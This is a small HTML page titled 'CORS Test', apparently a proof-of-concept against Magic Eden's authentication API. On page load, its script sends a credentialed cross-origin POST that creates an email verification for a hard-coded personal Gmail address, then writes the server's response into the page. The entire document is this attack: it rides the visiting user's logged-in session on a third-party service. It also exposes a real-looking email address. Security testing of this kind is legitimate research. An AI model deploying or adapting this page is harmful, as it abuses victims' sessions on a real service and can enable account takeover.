<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CORS Test</title>
</head>
<body>
<h1>CORS Test</h1>
<script>
fetch("https://auth.magiceden.io/api/v0/sdk/c1314b5b-ece8-4f4f-a879-3894dda364e4/emailVerifications/create", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        email: "yahyashahin812@gmail.com"
    })
})
.then(response => response.text())
.then(data => {
    document.body.innerHTML += "<pre>" + data + "</pre>";
})
.catch(error => {
    document.body.innerHTML += "<p>Error: " + error + "</p>";
});
</script>
</body>
</html>
